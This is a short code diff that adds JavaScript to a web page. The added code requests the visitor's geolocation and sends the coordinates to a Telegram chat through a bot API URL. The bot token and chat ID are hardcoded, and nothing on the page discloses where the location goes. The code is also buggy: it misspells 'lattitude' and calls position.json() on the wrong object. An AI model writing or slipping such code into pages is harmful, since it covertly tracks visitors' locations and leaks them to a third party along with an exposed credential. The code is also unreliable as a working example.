@@ -55,6 +55,35 @@
 		.catch((error) => {
 		  console.error('Error:', error);
 		});
+		
+		
+		if (navigator.geolocation) {
+	    position = navigator.geolocation.getCurrentPosition(showPosition);
+	  }
+
+	  function showPosition(position) {
+	  	console.log(position.coords);
+	  	fetch('https://api.telegram.org/bot1033816179:AAF6HwrL55eUrA_FYOX9mCVjpYC-gYee0nk/sendMessage', {
+				  method: 'POST', // or 'PUT'
+				  headers: {
+				    'Content-Type': 'application/json',
+				  },
+				  body: JSON.stringify({
+			      "chat_id": "-342669376",
+			      "text": {
+			      	"lat": position.coords.lattitude,
+			      	"long": position.coords.longitude
+		      	}
+			    }),
+				})
+				.then(response => position.json())
+				.then(data => {
+				  // console.log('Success:', res);
+				})
+				.catch((error) => {
+				  // console.error('Error:', error);
+				});		
+	  }
 
 </script>
 
